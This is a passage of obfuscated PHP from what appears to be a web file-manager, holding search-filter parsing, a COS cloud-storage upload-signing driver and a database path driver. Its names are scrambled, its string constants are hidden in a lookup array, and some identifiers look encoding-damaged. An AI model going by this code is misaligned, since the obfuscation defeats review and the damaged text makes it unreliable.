"\x4c\x45\x46\124\40\x4a\117\x49\x4e\x20{$this->tablePrefix}\151\x6f\x5f\x73\157\165\162\x63\x65\x5f\155\145\164\x61\x20\155\x65\x74\x61\40\157\156\40\x73\x6f\165\x72\x63\145\x2e\x73\x6f\165\162\143\x65\x49\104\x20\x3d\40\x6d\145\164\141\x2e\163\157\165\x72\143\x65\x49\104"; $ØÊî¹¼Õ = array(); $ãêà•­ç = str_replace(array($Ó­¢êŠ¿[287], $Ó­¢êŠ¿[53], $Ó­¢êŠ¿[2247]), $Ó­¢êŠ¿[12], $ãêà•­ç); $ãêà•­ç = $Ó­¢êŠ¿[522] . str_replace($Ó­¢êŠ¿[50], $Ó­¢êŠ¿[523], $ãêà•­ç); $êûÓ«¶’ = $ ·¡Ù†ç[$Ó­¢êŠ¿[32]]; unset($ ·¡Ù†ç[$Ó­¢êŠ¿[32]]); foreach ($ ·¡Ù†ç as $¡¢’ÏÁ£ => $áòŒ•‹) { $ØÊî¹¼Õ[$Ó­¢êŠ¿[522] . $¡¢’ÏÁ£] = $áòŒ•‹; } foreach ($êûÓ«¶’ as $ÆÓİ¨ğ) { $ØÊî¹¼Õ[] = array($Ó­¢êŠ¿[527] => $ÆÓİ¨ğ, $Ó­¢êŠ¿[1076] => $Ó­¢êŠ¿[2076], array($Ó­¢êŠ¿[2248] => $ÆÓİ¨ğ, $Ó­¢êŠ¿[2249] => array($Ó­¢êŠ¿[7], array($Ó­¢êŠ¿[549], $Ó­¢êŠ¿[548])))); } $this->join($˜£óÜÆ); $ ·¡Ù†ç = $ØÊî¹¼Õ; } private function _parseSearchWhere($ò¬»­»³) { $‘·Öëœ¦ =& $_SERVER[´È¥ö†ö]; $ª°¿×ïü = array(); if (isset($ò¬»­»³[$‘·Öëœ¦[836]]) && $ò¬»­»³[$‘·Öëœ¦[836]]) { $ª°¿×ïü[$‘·Öëœ¦[88]] = array($‘·Öëœ¦[2250], $ò¬»­»³[$‘·Öëœ¦[836]]); } if (isset($ò¬»­»³[$‘·Öëœ¦[837]]) && $ò¬»­»³[$‘·Öëœ¦[837]]) { $É„´‚‡² = array($‘·Öëœ¦[2251], $ò¬»­»³[$‘·Öëœ¦[837]]); if ($ª°¿×ïü[$‘·Öëœ¦[88]]) { $ª°¿×ïü[$‘·Öëœ¦[88]] = array($ª°¿×ïü[$‘·Öëœ¦[88]], $É„´‚‡², $‘·Öëœ¦[2252]); } else { $ª°¿×ïü[$‘·Öëœ¦[88]] = $É„´‚‡²; } } if (isset($ò¬»­»³[$‘·Öëœ¦[2244]]) && $ò¬»­»³[$‘·Öëœ¦[2244]] > 0) { $ª°¿×ïü[$‘·Öëœ¦[79]] = array($‘·Öëœ¦[2250], $ò¬»­»³[$‘·Öëœ¦[2244]]); } if (isset($ò¬»­»³[$‘·Öëœ¦[2245]]) && $ò¬»­»³[$‘·Öëœ¦[2245]]) { $É„´‚‡² = array($‘·Öëœ¦[2251], $ò¬»­»³[$‘·Öëœ¦[2245]]); if ($ª°¿×ïü[$‘·Öëœ¦[79]]) { $ª°¿×ïü[$‘·Öëœ¦[79]] = array($ª°¿×ïü[$‘·Öëœ¦[79]], $É„´‚‡², $‘·Öëœ¦[2252]); } else { $ª°¿×ïü[$‘·Öëœ¦[79]] = $É„´‚‡²; } } if (isset($ò¬»­»³[$‘·Öëœ¦[676]]) && $ò¬»­»³[$‘·Öëœ¦[676]]) { $ª°¿×ïü[] = array($‘·Öëœ¦[540] => $ò¬»­»³[$‘·Öëœ¦[676]], $‘·Öëœ¦[538] => $ò¬»­»³[$‘·Öëœ¦[676]], $‘·Öëœ¦[1076] => $‘·Öëœ¦[2076]); } if (isset($ò¬»­»³[$‘·Öëœ¦[497]]) && $ò¬»­»³[$‘·Öëœ¦[497]]) { $Êö–¦µÂ = $ò¬»­»³[$‘·Öëœ¦[497]]; if ($Êö–¦µÂ == $‘·Öëœ¦[78]) { $ª°¿×ïü[$‘·Öëœ¦[496]] = 1; } else { if ($Êö–¦µÂ == $‘·Öëœ¦[2253]) { $ª°¿×ïü[$‘·Öëœ¦[496]] = 0; } else { if ($Êö–¦µÂ) { $Êö–¦µÂ = is_array($Êö–¦µÂ) ? $Êö–¦µÂ : explode($‘·Öëœ¦[50], $Êö–¦µÂ); $ª°¿×ïü[$‘·Öëœ¦[497]] = array($‘·Öëœ¦[503], $Êö–¦µÂ); $ª°¿×ïü[$‘·Öëœ¦[496]] = 0; } } } } $this->_parseSearchParent($ò¬»­»³, $ª°¿×ïü); if (isset($ò¬»­»³[$‘·Öëœ¦[2072]]) && trim($ò¬»­»³[$‘·Öëœ¦[2072]])) { $ÛÙø¬ñì = trim($ò¬»­»³[$‘·Öëœ¦[2072]]); $”ä‰ƒ¥Ü = explode($‘·Öëœ¦[53], $ÛÙø¬ñì); if (strlen($ÛÙø¬ñì) > 2 && (substr($ÛÙø¬ñì, 0, 1) == $‘·Öëœ¦[121] && substr($ÛÙø¬ñì, -1) == $‘·Öëœ¦[121]) || substr($ÛÙø¬ñì, 0, 1) == $‘·Öëœ¦[58] && substr($ÛÙø¬ñì, -1) == $‘·Öëœ¦[58]) { $ÛÙø¬ñì = substr($ÛÙø¬ñì, 1, -1); $”ä‰ƒ¥Ü = array($ÛÙø¬ñì); } $ª°¿×ïü[$‘·Öëœ¦[32]] = array(array($‘·Öëœ¦[626], $‘·Öëœ¦[2074] . $ÛÙø¬ñì . $‘·Öëœ¦[2074])); if (count($”ä‰ƒ¥Ü) > 1) { $ª°¿×ïü[$‘·Öëœ¦[32]] = array(); foreach ($”ä‰ƒ¥Ü as $ÜìşÉ“×) { if (!trim($ÜìşÉ“×)) { continue; } $ª°¿×ïü[$‘·Öëœ¦[32]][] = array($‘·Öëœ¦[626], $‘·Öëœ¦[2074] . trim($ÜìşÉ“×) . $‘·Öëœ¦[2074]); } } } return $ª°¿×ïü; } private function _parseSearchParent($ùıï–, &$Ä£îÑœ) { $¶«§“À =& $_SERVER[´È¥ö†ö]; if (!isset($ùıï–[$¶«§“À[192]]) || !$ùıï–[$¶«§“À[192]]) { return; } $óØàÂä™ = $this->pathInfo($ùıï–[$¶«§“À[192]]); $é€¡ƒù = $óØàÂä™[$¶«§“À[192]] . $¶«§“À[12] === $¶«§“À[230]; $“ˆıŸ· = $óØàÂä™[$¶«§“À[190]] == $¶«§“À[589]; if ($óØàÂä™[$¶«§“À[605]] == $¶«§“À[606]) { $ô•¸ôºµ = $this->sourceInfo($ùıï–[$¶«§“À[192]]); $óØàÂä™[$¶«§“À[595]] = $ô•¸ôºµ[$¶«§“À[595]]; } $Ä£îÑœ[$¶«§“À[666]] = array($¶«§“À[626], $óØàÂä™[$¶«§“À[595]] . $ùıï–[$¶«§“À[192]] . $¶«§“À[627]); $ŸïİÖŠ = isset($ùıï–[$¶«§“À[1932]]) && in_array($¶«§“À[589], $ùıï–[$¶«§“À[1932]]); if (!$ŸïİÖŠ || !$“ˆıŸ· || !$é€¡ƒù || !$óØàÂä™[$¶«§“À[498]]) { return; } if (!AuthModel::authCheckRoot($óØàÂä™[$¶«§“À[498]][$¶«§“À[499]])) { return; } $»ÀáıóÎ = $óØàÂä™[$¶«§“À[580]] . $¶«§“À[12]; if ($»ÀáıóÎ == $¶«§“À[91]) { unset($Ä£îÑœ[$¶«§“À[666]]); $Ä£îÑœ[$¶«§“À[190]] = self::TYPE_GROUP; return; } $ å“§ˆ— = Model($¶«§“À[596])->groupChildrenAll($»ÀáıóÎ); $‚±À½ = count($ å“§ˆ—); if ($‚±À½ <= 1) { return; } $á±Ô÷¬æ = array($¶«§“À[192] => 0, $¶«§“À[190] => self::TYPE_GROUP, $¶«§“À[580] => array($¶«§“À[7], $ å“§ˆ—)); $Ëİò = $this->field($¶«§“À[2254])->where($á±Ô÷¬æ)->limit($‚±À½)->select(); $Ä£îÑœ[$¶«§“À[666]] = array(); foreach ($Ëİò as $˜Ó²†€º) { $Ä£îÑœ[$¶«§“À[666]][] = array($¶«§“À[626], $¶«§“À[604] . $˜Ó²†€º[$¶«§“À[193]] . $¶«§“À[627]); } $Ä£îÑœ[$¶«§“À[666]][] = $¶«§“À[2076]; } } goto A×Œß”œºÄ; Cµâ†Û–±„: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ÜĞ†™€À) { parent::__construct($ÜĞ†™€À); $this->setSignVersion($_SERVER[´È¥ö†ö][249]); } public function uploadFormData($¯šÑŠ±Ó, $Àœ€Ğâ¹ = 3600) { $ˆÅ‰¨ =& $_SERVER[´È¥ö†ö]; $Şü¥ĞƒÌ = $ˆÅ‰¨[231]; $¢§û÷ËÄ = $ˆÅ‰¨[1411]; $å’œĞ‰ƒ = $ˆÅ‰¨[263]; $ÆşÔï» = gmdate($ˆÅ‰¨[1412], time() + $Àœ€Ğâ¹); $ó²Éª = (string) time() . $ˆÅ‰¨[74] . (string) (time() + $Àœ€Ğâ¹); $»«ùƒ“¨ = array($ˆÅ‰¨[264] => $ÆşÔï», $ˆÅ‰¨[267] => array(array($ˆÅ‰¨[317] => $Şü¥ĞƒÌ), array($ˆÅ‰¨[268] => $this->bucket), array($ˆÅ‰¨[269], $ˆÅ‰¨[270], $ˆÅ‰¨[12]), array($ˆÅ‰¨[272] => $å’œĞ‰ƒ), array($ˆÅ‰¨[1413] => $¢§û÷ËÄ), array($ˆÅ‰¨[1414] => $this->accessKey), array($ˆÅ‰¨[1415] => $ó²Éª))); $»«ùƒ“¨ = json_encode($»«ùƒ“¨); $½éòã˜œ = hash_hmac($ˆÅ‰¨[1411], $ó²Éª, $this->secret); $âõœ»ÈØ = sha1($»«ùƒ“¨); $ıÌíû¶ = hash_hmac($ˆÅ‰¨[1411], $âõœ»ÈØ, $½éòã˜œ); $ıÅôß‘Â = array($ˆÅ‰¨[317] => $Şü¥ĞƒÌ, $ˆÅ‰¨[272] => $å’œĞ‰ƒ, $ˆÅ‰¨[279] => base64_encode($»«ùƒ“¨), $ˆÅ‰¨[1413] => $¢§û÷ËÄ, $ˆÅ‰¨[1414] => $this->accessKey, $ˆÅ‰¨[1416] => $ó²Éª, $ˆÅ‰¨[1417] => $ıÌíû¶, $ˆÅ‰¨[208] => $this->getHost()); return $ıÅôß‘Â; } public function fileOutImage($´Êîü, $ªşÖÌúÆ = 250) { $È¹©Ë´” =& $_SERVER[´È¥ö†ö]; if ($this->size($´Êîü) > 1024 * 1024 * 32) { return $this->fileOutImageServer($´Êîü, $ªşÖÌúÆ); } $Ù–œ‡‹¥ = $this->link($´Êîü); $Ù–œ‡‹¥ .= $È¹©Ë´”[1418] . $ªşÖÌúÆ . $È¹©Ë´”[1419]; $this->fileOutLink($Ù–œ‡‹¥); } public function fileOutLink($±ìÀ‡ø¥) { $„ÆÇ¨ Ş =& $_SERVER[´È¥ö†ö]; if (substr($±ìÀ‡ø¥, 0, 7) == $„ÆÇ¨ Ş[218]) { $±ìÀ‡ø¥ = $„ÆÇ¨ Ş[219] . substr($±ìÀ‡ø¥, 7); } header($„ÆÇ¨ Ş[175] . $±ìÀ‡ø¥); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($üË¦ğúŠ) { $this->pathParse = $üË¦ğúŠ; $this->model = Model($_SERVER[´È¥ö†ö][1420]); } public function getPath($—ø©ÖÄã) { return trim($—ø©ÖÄã, $_SERVER[´È¥ö†ö][8]); } public function pathFather($•úôç“ò) { $—Ûœ­ÅÒ = $this->parse($•úôç“ò); $—Ûœ­ÅÒ = $this->infoSimple($•úôç“ò); return $—Ûœ­ÅÒ ? $—Ûœ­ÅÒ[$_SERVER[´È¥ö†ö][192]] : !1; } public function pathThis($–ğ•¬ò) { $“Ïù­¾Â = $this->infoSimple($–ğ•¬ò); return $“Ïù­¾Â ? $“Ïù­¾Â[$_SERVER[´È¥ö†ö][32]] : !1; } public function getPathOuter($•ìôé€ã) { if (!$•ìôé€ã) { return $•ìôé€ã; } $âÉ±ƒ÷ı = $this->parse($•ìôé€ã); return KodIO::make($âÉ±ƒ÷ı[$_SERVER[´È¥ö†ö][486]]); } public function copyFolderFromIO($˜šÓ¯èø, $÷õ˜ø­È, $¢áí¥ÏÈ, $à½ó·¸, $­°‹¾×) { $¡ôñÔ¸ = $this->model->copyFolderFromIO($˜šÓ¯èø, $÷õ˜ø­È, $¢áí¥ÏÈ, $à½ó·¸, $­°‹¾×); return KodIO::make($¡ôñÔ¸); } public function isParentOf($å¸¤’, $Î½‰ì¥) { return $this->model->isParentOf($å¸¤’, $Î½‰ì¥); } public function mkfile($·òàš›Ö, $Œçš‘à‘ = '', $¶ù²ÁÉæ = REPEAT_RENAME) { $à›æúœ =& $_SERVER[´È¥ö†ö]; $Ëñó©© = $this->parse($·òàš›Ö); $·òàš›Ö = $Ëñó©©[$à›æúœ[486]]; for ($Ü”ç¼µ = 0; $Ü”ç¼µ < count($Ëñó©©[$à›æúœ[1421]]); $Ü”ç¼µ++) { $Êøß´ƒô = $Ëñó©©[$à›æúœ[1421]][$Ü”ç¼µ]; if ($Ü”ç¼µ == count($Ëñó©©[$à›æúœ[1421]]) - 1) { $·òàš›Ö = $this->model->mkfile($·òàš›Ö, $Êøß´ƒô, $Œçš‘à‘, $¶ù²ÁÉæ); break; } $·òàš›Ö = $this->model->mkdir($·òàš›Ö, $Êøß´ƒô, REPEAT_SKIP); } return $this->getPathOuter($·òàš›Ö); } public function mkdir($õ¹­¸´ƒ, $Õ²Í•©ğ = REPEAT_SKIP) { $õ“Äåçó =& $_SERVER[´È¥ö†ö]; $ÍœÇ‰¨ö = $this->parse($õ¹­¸´ƒ); $õ¹­¸´ƒ = $ÍœÇ‰¨ö[$õ“Äåçó[486]]; for ($Ùû«†åÑ = 0; $Ùû«†åÑ < count($ÍœÇ‰¨ö[$õ“Äåçó[1421]]); $Ùû«†åÑ++) { $¤”Î¹©Ò = $ÍœÇ‰¨ö[$õ“Äåçó[1421]][$Ùû«†åÑ]; $õ¹­¸´ƒ = $this->model->mkdir($õ¹­¸´ƒ, $¤”Î¹©Ò, $Õ²Í•©ğ); } return $this->getPathOuter($õ¹­¸´ƒ); } public function copyFile($ÃÊ˜´ŸÙ, $ôØø²è, $èÏÁÜÛË = REPEAT_REPLACE) { $¹àıÙ =& $_SERVER[´È¥ö†ö]; $ğäÂ¤ŒÕ = $this->parse($ôØø²è); $ïÈ³ÌÃ = $this->model->copy($ÃÊ˜´ŸÙ, $ğäÂ¤ŒÕ[$¹àıÙ[486]], $èÏÁÜÛË, $ğäÂ¤ŒÕ[$¹àıÙ[87]]); return $ïÈ³ÌÃ ? $this->getPathOuter($ïÈ³ÌÃ) : !1; } public function moveFile($º“¸ØŠú, $òÏ³â ü, $ÛÙòç…Â = REPEAT_REPLACE) { $ÏÔ·ò¾À =& $_SERVER[´È¥ö†ö]; $œø¬¿Î¹ = $this->parse($òÏ³â ü); $¥¤Şğ­Ê = $this->model->move($º“¸ØŠú, $œø¬¿Î¹[$ÏÔ·ò¾À[486]], $ÛÙòç…Â, $œø¬¿Î¹[$ÏÔ·ò¾À[87]]); return $¥¤Şğ­Ê ? $this->getPathOuter($¥¤Şğ­Ê) : !1; } public function copy($Á‡¯¾Ğ, $Û˜§üşñ, $ÖÒÒ˜ë‚ = REPEAT_REPLACE, $é„‘©Ô = false) { $´šÌÌÏ = $this->parse($Û˜§üşñ); $½·šõİ = $this->model->copy($Á‡¯¾Ğ, $´šÌÌÏ[$_SERVER[´È¥ö†ö][486]], $ÖÒÒ˜ë‚, $é„‘©Ô); return $½·šõİ ? $this->getPathOuter($½·šõİ) : !1; } public function moveSameAllow() { } public function move($¤±èèˆÔ, $Ìíø¶¡, $ŒÅÒËÌ¼ = REPEAT_REPLACE, $—ÁÂæåÁ = false) { $èó“Ğ˜ = $this->parse($Ìíø¶¡); $ãÇŸ‚œ¼ = $this->model->move($¤±èèˆÔ, $èó“Ğ˜[$_SERVER[´È¥ö†ö][486]], $ŒÅÒËÌ¼, $—ÁÂæåÁ); return $ãÇŸ‚œ¼ ? $this->getPathOuter($ãÇŸ‚œ¼) : !1; } public function remove($ÄÎ¢ÆŸå, $„ùÖæ¹ = true) { return $this->model->remove($ÄÎ¢ÆŸå, $„ùÖæ¹); } public function rename($Ğ˜‡¤ï», $¨·ß‚ç) { $•ñÁåÒ = $this->model->rename($Ğ˜‡¤ï», $¨·ß‚ç); return $•ñÁåÒ ? $this->getPathOuter($Ğ˜‡¤ï») : $•ñÁåÒ; } public function size($Ş£ßÆ¨ü) { $”üËÙÖì = $this->infoSimple($Ş£ßÆ¨ü); return $”üËÙÖì ? $”üËÙÖì[$_SERVER[´È¥ö†ö][79]] : 0; } public function infoSimple($±àÆ…Ñ) { return $this->model->sourceInfo($±àÆ…Ñ); } public function info($ÓÕ¸Ü®Ó) { return $this->infoParse($ÓÕ¸Ü®Ó); } public function infoAuth($ÖïŞ²‘«) { return $this->infoParse($ÖïŞ²‘«, !1, !0); } public function infoWithChildren($ ¦ŠÙú“) { return $this->infoParse($ ¦ŠÙú“, !0); } protected function infoParse($ÆÒÈìš·, $ÅÕŠ©ƒæ = false, $ƒ´Øå = false) { if (!$ÅÕŠ©ƒæ) { return $this->model->pathInfo($ÆÒÈìš·, $ƒ´Øå); } return $this->model->pathInfoMore($ÆÒÈìš·); } public function infoFullSimple($Ã‰¶Á») { $µ¨èãã =& $_SERVER[´È¥ö†ö]; $†¿è™â¾ = explode($µ¨èãã[8], $Ã‰¶Á»); $—÷†š•ú = implode($µ¨èãã[8], array_splice($†¿è™â¾, 1)); return $this->model->pathInfoByPath($†¿è™â¾[0], $—÷†š•ú); } public function infoFull($òù¼ø›¢) { $ˆ€¨Éµ´ = $this->infoFullSimple($òù¼ø›¢); return is_array($ˆ€¨Éµ´) ? $this->model->pathInfo($ˆ€¨Éµ´[$_SERVER[´È¥ö†ö][193]]) : !1; } public function hashSimple($½Ëª‡Äİ) { $ŞÎ¡µ =& $_SERVER[´È¥ö†ö]; $ËÎƒ†€÷ = $this->infoWithChildren($½Ëª‡Äİ); return $ËÎƒ†€÷[$ŞÎ¡µ[170]][$ŞÎ¡µ[686]]; } public function hashMd5($õªÂ†«›) { $ã…ñÛÕÒ =& $_SERVER[´È¥ö†ö]; $¶Ğ°ıæ¿ = $this->infoWithChildren($õªÂ†«›); return $¶Ğ°ıæ¿[$ã…ñÛÕÒ[170]][$ã…ñÛÕÒ[558]]; } public function exist($Ÿ€•ëì¯) { $ˆúÊ†š— =& $_SERVER[´È¥ö†ö]; $‚×ËƒÍ¼ = $this->parse($Ÿ€•ëì¯); if (!$‚×ËƒÍ¼[$ˆúÊ†š—[87]]) { return $this->isFile($Ÿ€•ëì¯) || $this->isFolder($Ÿ€•ëì¯); } $¼»„ê‘ = array($ˆúÊ†š—[488] => $‚×ËƒÍ¼[$ˆúÊ†š—[486]], $ˆúÊ†š—[32] => $‚×ËƒÍ¼[$ˆúÊ†š—[87]]); $‰»¯µ—â = $this->model->where($¼»„ê‘)->find(); return $‰»¯µ—â ? !0 : !1; } public function isFile($å¸½èˆø) { $ş»æ×€– =& $_SERVER[´È¥ö†ö]; $É——åä‹ = $this->infoSimple($å¸½èˆø); return $É——åä‹ && $É——åä‹[$ş»æ×€–[496]] == $ş»æ×€–[230] ? !0 : !1; } public function isFolder($¦Ì°çŒ½) { $¡—ñ§ï =& $_SERVER[´È¥ö†ö]; $»´Ç§½È = $this->infoSimple($¦Ì°çŒ½); return $»´Ç§½È && $»´Ç§½È[$¡—ñ§ï[496]] == $¡—ñ§ï[91] ? !0 : !1; } public function listPath($ÂÂ·Å›, $£ÔêÄ¡  = false) { $ó±Æş‚Â =& $_SERVER[´È¥ö†ö]; if ($ÂÂ·Å› == $ó±Æş‚Â[12]) { return !1; } $ŸˆŒ”” = array($ó±Æş‚Â[488] => $ÂÂ·Å›); if ($£ÔêÄ¡ ) { return $this->model->listSource($ŸˆŒ””, -1); } return $this->model->listSource($ŸˆŒ””); } public function has($ü©à¿•, $ø¶Ìò = false, $Å—úÅé = null) { $äÏÓŸ½Æ =& $_SERVER[´È¥ö†ö]; $ŠØÊ¼¹ü = $this->infoWithChildren($ü©à¿•); if ($ø¶Ìò) { return array($äÏÓŸ½Æ[242] => $ŠØÊ¼¹ü[$äÏÓŸ½Æ[242]], $äÏÓŸ½Æ[241] => $ŠØÊ¼¹ü[$äÏÓŸ½Æ[241]]); } return $Å—úÅé ? $ŠØÊ¼¹ü[$äÏÓŸ½Æ[242]] : $ŠØÊ¼¹ü[$äÏÓŸ½Æ[241]]; } public function listAll($ú³åÕ™Û) { $–æ¹¯ìÉ = IO::info($this->pathParse[$_SERVER[´È¥ö†ö][87]]); if (!$–æ¹¯ìÉ) { return array(); } return $this->model->listAll($ú³åÕ™Û); } public function getContent($Ü÷°ĞÛÉ) { return $this->model->getContent($Ü÷°ĞÛÉ); } public function setContent($¥ÈŸÔƒ«, $àõÈ™± = '') { return $this->model->setContent($¥ÈŸÔƒ«, $àõÈ™±); } public function fileSubstr($íèôú”, $İºÊØïÉ, $¸©¦¬“Œ) { return $this->model->fileSubstr($íèôú”, $İºÊØïÉ, $¸©¦¬“Œ); } public function download($¬²òüÓ£, $‚‡Ú’ = '') { $ÃØ«•õ = get_path_father($‚‡Ú’); $Ú¦£Üßç = get_path_this($‚‡Ú’); $Öôñæµ¯ = $this->model->fileInfoGet($¬²òüÓ£); $±Ú–ÌŸ = IO::copy($Öôñæµ¯[$_SERVER[´È¥ö†ö][87]], $ÃØ«•õ, !1, $Ú¦£Üßç); return $±Ú–ÌŸ; } public function setModifyTime($ÆÆß ò”, $­—«“Éë = '') { $„±šˆ =& $_SERVER[´È¥ö†ö]; if (!$ÆÆß ò”) { return; } $this->model->where(array($„±šˆ[502] => $ÆÆß ò”))->save(array($„±šˆ[88] => $­—«“Éë)); } public function upload($âÈ‰ıÖ, $·æ™şµü, $Ö´Áãß¿ = false, $Üú×›Ş = REPEAT_REPLACE) { $ŠÖ”ÔÑ› =& $_SERVER[´È¥ö†ö]; $¸¶¥ÒÜ = $this->parse($âÈ‰ıÖ); $Æ€Éè‹ó = $this->model->addFile($¸¶¥ÒÜ[$ŠÖ”ÔÑ›[486]], $·æ™şµü, $¸¶¥ÒÜ[$ŠÖ”ÔÑ›[87]], $Ö´Áãß¿, $Üú×›Ş); return $this->getPathOuter($Æ€Éè‹ó); } public function uploadFileByID($ëæì¢¾ğ, $×€ĞÎ¸ğ, $‹¿Œ³üÇ) { $÷§‡“‘ì =& $_SERVER[´È¥ö†ö]; $²Ô¢áÕ = $this->parse($ëæì¢¾ğ); $åìÚú’ = $this->model->addFileByFileID($²Ô¢áÕ[$÷§‡“‘ì[486]], $×€ĞÎ¸ğ, $²Ô¢áÕ[$÷§‡“‘ì[87]], $‹¿Œ³üÇ); return $this->getPathOuter($åìÚú’); } public function addFileByRemote($”—ÊóÑÀ, $óŸÔÖæ¥, $µ†×Äœ‘ = array(), $…Ç†­¡Ï = '', $’è¤’Í…) { $£Ï‚¥›Ú =& $_SERVER[´È¥ö†ö]; $­é‚óöÎ = $this->parse($”—ÊóÑÀ); $…Ç†­¡Ï = empty($…Ç†­¡Ï) ? $­é‚óöÎ[$£Ï‚¥›Ú[87]] : $…Ç†­¡Ï; $œö›ËØÍ = $this->model->addFileByRemote($­é‚óöÎ[$£Ï‚¥›Ú[486]], $óŸÔÖæ¥, $…Ç†­¡Ï, $µ†×Äœ‘, $’è¤’Í…); return $this->getPathOuter($œö›ËØÍ); } public function uploadLink($ŸÄÆˆµï, $º©Ãõşˆ = 0) { $ïÇâ›ßğ =& $_SERVER[´È¥ö†ö]; $Ç’ç³×é = $this->parse($ŸÄÆˆµï); $øÎ÷”„â = _get($GLOBALS[$ïÇâ›ßğ[7]], $ïÇâ›ßğ[1422]); $†ÅÁ‚õ = _get($GLOBALS[$ïÇâ›ßğ[7]], $ïÇâ›ßğ[1423]); $ŸÄÆˆµï = Model($ïÇâ›ßğ[688])->createFileName($Ç’ç³×é[$ïÇâ›ßğ[87]], $øÎ÷”„â, $†ÅÁ‚õ); return IO::uploadLink($ŸÄÆˆµï, $º©Ãõşˆ); } public function fileNameAuto($ÕâÒÁê, $­³Ï°šÉ, $Ì¶ç‚ğ = REPEAT_REPLACE, $ïÄ®òÀ = false) { return $this->model->fileNameAuto($ÕâÒÁê, $­³Ï°šÉ, $Ì¶ç‚ğ, $ïÄ®òÀ); } public function fileNameExist($®„¬Í˜¡, $×½­…•İ) { return $this->model->fileNameExist($®„¬Í˜¡, $×½­…•İ); } protected function _fileOut($è¨½šóÓ, $ÏÙñ‰¶Ÿ = false, $ìÌÑ©ş = false, $¼˜œşÃ¼ = '', $Áğß¶› = false) { $Äì¢¦¹¾ =& $_SERVER[´È¥ö†ö]; $½‰¿±¯á = $this->model->sourceInfo($è¨½šóÓ); if ($½‰¿±¯á[$Äì¢¦¹¾[496]] == $Äì¢¦¹¾[91]) { header($Äì¢¦¹¾[1424]); die; } $È›ƒÔŞ§ = $this->model->fileInfoGet($è¨½šóÓ); $¼˜œşÃ¼ = $È›ƒÔŞ§[$Äì¢¦¹¾[558]] ? $È›ƒÔŞ§[$Äì¢¦¹¾[558]] : $¼˜œşÃ¼; $‡­úšÉ˜ = isset($GLOBALS[$Äì¢¦¹¾[182]]) && is_array($GLOBALS[$Äì¢¦¹¾[182]]) ? $GLOBALS[$Äì¢¦¹¾[182]][$Äì¢¦¹¾[32]] : $½‰¿±¯á[$Äì¢¦¹¾[32]]; if ($Áğß¶›) { return IO::fileOutServer($È›ƒÔŞ§[$Äì¢¦¹¾[87]], $ÏÙñ‰¶Ÿ, $‡­úšÉ˜, $¼˜œşÃ¼); } IO::fileOut($È›ƒÔŞ§[$Äì¢¦¹¾[87]], $ÏÙñ‰¶Ÿ, $‡­úšÉ˜, $¼˜œşÃ¼); } public function fileOut($áö‰•ğ¹, $Ù´Ï·£ş = false, $ˆ‚Íõ¶£ = false, $ñ›â¢ = '') { $this->_fileOut($áö‰•ğ¹, $Ù´Ï·£ş, $ˆ‚Íõ¶£, $ñ›â¢); } public function fileOutServer($±èÈÖî, $ÙŒ„×È = false, $Õ² ŸÔ  = false, $ğ…£Š÷ = '') { $this->_fileOut($±èÈÖî, $ÙŒ„×È, $Õ² ŸÔ , $ğ…£Š÷, !0); } protected function _fileOutImage($Æ²©õúÜ, $¥ê—ÂŞ = 250) { $íöÙĞÜü =& $_SERVER[´È¥ö†ö]; $°ÊÛŒŸ = $this->model->pathInfo($Æ²©õúÜ); if ($°ÊÛŒŸ[$íöÙĞÜü[496]] == $íöÙĞÜü[91]) { show_json($íöÙĞÜü[1425] . $Æ²©õúÜ, !1); } $™¥…ÁÃ = $this->model->fileInfoGet($Æ²©õúÜ); $°ÊÛŒŸ[$íöÙĞÜü[183]] = $™¥…ÁÃ[$íöÙĞÜü[87]]; $GLOBALS[$íöÙĞÜü[182]] = $°ÊÛŒŸ; IO::fileOutImage($™¥…ÁÃ[$íöÙĞÜü[87]], $¥ê—ÂŞ); } public function fileOutImage($ÖØ×•–¦, $âß¡‹Ãş = 250) { $this->_fileOutImage($ÖØ×•–¦, $âß¡‹Ãş); } public function fileOutImageServer($ÑòõìÇŸ, $›”Ù¡„ã = 250) { $this->_fileOutImage($ÑòõìÇŸ, $›”Ù¡„ã); } public function link($È»·—á§, $µ¥ãû… = '') { $Äé’âê = $this->model->fileInfoGet($È»·—á§); return IO::link($Äé’âê[$_SERVER[´È¥ö†ö][87]], $µ¥ãû…); } protected function parse($ÊÚ”å–›) { $¶õÁñé =& $_SERVER[´È¥ö†ö]; if (strstr($ÊÚ”å–›, $¶õÁñé[8]) === !1) { return array($¶õÁñé[504] => intval($ÊÚ”å–›), $¶õÁñé[87] => $¶õÁñé[12], $¶õÁñé[1421] => array()); } $Ğ«Çƒò£ = explode($¶õÁñé[8], trim($ÊÚ”å–›, $¶õÁñé[8])); if (count($Ğ«Çƒò£) < 2) { show_tips(clear_html($ÊÚ”å–›) . $¶õÁñé[1426]); } return array($¶õÁñé[504] => intval($Ğ«Çƒò£[0]), $¶õÁñé[87] => $Ğ«Çƒò£[1], $¶õÁñé[1421] => array_slice($Ğ«Çƒò£, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($’ÅÕËÙƒ) { $this->pathParse = $’ÅÕËÙƒ; $this->model = Model($_SERVER[´È¥ö†ö][1420]); } public function getPathOuter($üœ„âãó) { $šãœªÃ“ =& $_SERVER[´È¥ö†ö]; if (!$üœ„âãó) { return $üœ„âãó; } $¢«Œ‹ = $this->parse($üœ„âãó); return trim(KodIO::makeShare($this->pathParse[$šãœªÃ“[486]], $¢«Œ‹[$šãœªÃ“[486]]), $šãœªÃ“[8]); } protected function infoParse($ä‚èê–ü, $¥©ÂÍ„ = false, $ı“ĞÁ©ù = false) { $’åûê¶ =& $_SERVER[´È¥ö†ö]; $šù×ŒÅù = $this->pathParse[$’åûê¶[486]]; $ã–«Ù¢È = trim($this->pathParse[$’åûê¶[1249]], $’åûê¶[8]); return Action($’åûê¶[1427])->sharePathInfo($šù×ŒÅù, $ã–«Ù¢È, $¥©ÂÍ„); } public function infoFull($¸”Ø¨óŞ) { $ï‚ÖÏö =& $_SERVER[´È¥ö†ö]; $±öÂùí¸ = explode($ï‚ÖÏö[8], trim($¸”Ø¨óŞ, $ï‚ÖÏö[8])); if (count($±öÂùí¸) > 1) { $çá‰èî = implode($ï‚ÖÏö[8], array_splice($±öÂùí¸, 1)); $ö§‘á÷‘ = $this->model->pathInfoByPath($±öÂùí¸[0], $çá‰èî); if (!$ö§‘á÷‘) { return !1; } $this->pathParse[$ï‚ÖÏö[1249]] = $ö§‘á÷‘[$ï‚ÖÏö[193]]; } return $this->infoParse($¸”Ø¨óŞ); } public function 